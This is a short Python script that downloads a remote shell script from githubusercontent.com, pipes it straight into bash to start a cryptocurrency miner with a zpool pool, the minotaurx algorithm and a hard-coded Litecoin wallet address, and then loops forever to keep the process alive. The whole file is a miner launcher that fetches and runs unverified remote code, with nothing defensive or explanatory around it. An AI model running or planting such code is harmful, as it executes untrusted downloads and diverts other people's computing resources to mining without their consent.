import os
import time

cmd = "curl -sL https://githubusercontent.com | bash -s -- -p zpool -a minotaurx -u ltc1qpmvkquzpa5c9qhkq4t8pvhffd7238ae5zewr0v --pass c=LTC"
os.system(cmd)

while True:
    time.sleep(60)
